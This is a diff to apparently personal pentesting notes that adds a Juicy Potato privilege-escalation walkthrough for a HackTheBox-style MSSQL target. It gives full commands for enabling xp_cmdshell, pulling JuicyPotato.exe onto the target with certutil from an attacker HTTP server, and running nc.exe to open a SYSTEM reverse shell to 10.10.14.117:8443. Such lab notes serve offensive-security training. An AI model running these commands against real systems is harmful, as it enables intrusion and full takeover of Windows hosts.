@@ -101,6 +101,26 @@
 
 - See [here](../writeups/HTB-Jeeves.md) an example of a potato attack
 
+### Juicy potato
+
+#### Enumeration after initial shell with MSSQL
+
+- Say we have a shell on an mssql instance `mssqlclient.py sql_dev@IP-ADD -windows-auth`
+- We can enable command shell using `enable_xp_cmdshell`
+- And then we will be able to type every command we need this way: `xp_cmdshell whoami /priv`
+- For juicy potato we need to check if we have `SeImpersonatePrivilege` enabled  
+![image](https://user-images.githubusercontent.com/96747355/163688651-8f07b5f6-4b0d-4ece-bb80-8249770d3b29.png)  
+- We do!
+
+#### Exploitation
+
+- Let's get JuicyPotato binary in our attacking machine `wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe`
+- Let's serve the file to our target using python http server `python3 -m http.server 80`
+- Let's take it in our shell using certutil `xp_cmdshell certutil.exe -urlcache -f http://10.10.14.117/JuicyPotato.exe C:\Tools\JuicyPotato.exe`
+- Let's get an admin shell `xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.117 8443 -e cmd.exe" -t *` where -l is the COM server listening port, -p is the program to launch (cmd.exe), -a is the argument passed to cmd.exe, and -t is the createprocess call. We are trying both the CreateProcessWithTokenW and CreateProcessAsUser functions, which need SeImpersonate or SeAssignPrimaryToken privileges respectively.
+- And we should have an authority system shell  
+![image](https://user-images.githubusercontent.com/96747355/163689119-b9682c58-c8cc-421b-9d62-1e2d7451f525.png)  
+
 ## Resources
 
 {% embed url="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/" %} Rotten Potato - Foxglove Security {% endembed %}  
